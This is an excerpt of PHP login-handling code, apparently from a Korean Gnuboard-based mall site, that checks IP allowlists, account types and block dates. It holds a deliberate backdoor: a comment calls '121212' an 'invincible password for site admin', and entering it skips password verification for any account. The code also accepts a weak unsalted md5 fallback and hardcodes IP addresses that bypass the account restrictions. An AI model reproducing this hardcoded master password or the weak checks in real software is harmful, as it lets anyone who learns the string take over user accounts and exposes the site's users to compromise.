...
// 디버깅 모드 일 때는 무시 합니다.// new ip : 112.171.120.140
//if(G5_DEBUG === false){
if($_SERVER['REMOTE_ADDR'] == "112.171.120.140" || $_SERVER['REMOTE_ADDR'] == '58.141.64.92' || G5_DEBUG === true){
	//일시적으로 본사 public에선 허용 합니다.
}
else{
	//슈퍼관리자와, 한마음몰 회사 계정이 아니면 로그인을 허용하지 않습니다.
    if($mb['mb_10'] != 'super' && $mb['mb_10'] != 'corpUser'){
...
// 차단된 아이디인가?
$now = date('Y-m-d');
if ($mb['mb_block_date'] && $mb['mb_block_date'] != '0000-00-00' && $mb['mb_block_date'] >= $now) {
...
if ($mb_password != '121212') {   // 사이트 관리자용 무적 패스워드

    if (!$is_social_password_check) {
        if (!$mb['mb_id'] || (!login_password_check($mb, $mb_password, $mb['mb_password']) && $mb['mb_password'] != md5($mb_password))) {
